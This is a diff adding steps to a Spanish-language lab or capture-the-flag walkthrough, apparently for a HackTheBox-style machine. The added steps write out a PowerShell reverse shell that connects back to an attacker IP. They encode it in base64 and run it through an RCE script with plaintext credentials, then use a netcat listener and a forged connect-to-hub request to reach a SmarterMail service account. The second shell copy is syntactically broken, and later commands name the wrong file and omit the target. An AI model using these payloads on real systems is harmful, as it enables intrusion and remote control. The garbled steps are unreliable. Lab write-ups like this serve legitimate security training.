@@ -159,6 +159,40 @@ python3 scripts/war_rce.py <USERNAME> '<PASSWORD>' <TARGET_IP> --shell
 
 El punto importante aquí es que `war_rce.py` forma parte de la cadena de acceso inicial.
 
+Hacemos un archivo ps1 (coloca la ip de tu kali)
+```bash
+cat > reverse.ps1 << 'EOF'
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.234',4444);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()
+EOF
+```
+
+Codificamos a base 64
+```bash
+# Guardar el payload generado
+cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0 > reverse_b64.txt
+
+# Verificar
+cat reverse_b64.txt
+```
+
+Ejecutamos el payload en Windows (coloca la ip objetivo)
+```bash
+python3 scripts/war_rce.py anderson.w 'Password123!' 10.129.81.107 "powershell -e $(cat reverse_b64.txt)"
+```
+
+Y obtenemos una shell interactiva como `anderson.w`.
+
 ---
 
 # 3. 🔀 Pivoting con Chisel
@@ -256,6 +290,71 @@ Start-Job -ScriptBlock {
     C:\Windows\Temp\chisel.exe client -v <KALI_IP>:9001 R:17017:127.0.0.1:17017
 }
 ```
+
+En Kali, crea el script de reverse shell, (usa la ip de tu kali):
+```bash
+cat > reverse.ps1 << 'EOF'
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.234',4445);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = stream.Read(bytes, 0, $bytes.Length)) -ne 0){
+    data=(New-Object-TypeNameSystem.Text.ASCIIEncoding).GetString(bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String);
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    sendbyte=([text.encoding]::ASCII).GetBytes(sendback2);
+    stream.Write(sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()
+EOF
+```
+
+En Kali, generamos la versión codificada:
+```bash
+cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0
+```
+
+El resultado anterior se pone como valor de PAYLOAD en hub.py.
+
+En kali dejamos  escuchando:
+```bash
+nc -lvnp 4445
+```
+
+Corremos el archivo:
+```bash
+python3 hub.py
+```
+
+Y en la terminal de Windows de Anderson:
+
+### Metodo 1
+```powershell
+$body = '{"hubAddress":"http://10.10.14.234:8081/","oneTimePassword":"test","nodeName":"victim"}'
+Invoke-WebRequest -Uri http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub -Method POST -Body $body -ContentType "application/json"
+```
+
+### Metodo2
+
+Creamos
+```bash
+```bash
+cat > smtp_exploit.ps1 << 'EOF'
+$body = '{"hubAddress":"http://10.10.14.234:8081/","oneTimePassword":"test","nodeName":"victim"}'; Invoke-WebRequest -Uri http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub -Method POST -Body $body -ContentType "application/json"
+EOF
+```
+
+Codificamos:
+```bash
+cat revshell.ps1 | iconv -t UTF-16LE | base64 -w 0 > smtp_exploit.b64
+```
+
+Ejecutamos en kali:
+```bash
+python3 wac_rce.py anderson.w 'R3dT3am@Acc3ss#01' "powershell -e $(cat smtp_exploit.b64)"
+```
+
+Cualquiera de los dos motodos nos dara acces a svc_mail y a la interfaz de SmarterMail.
 
 ---
 
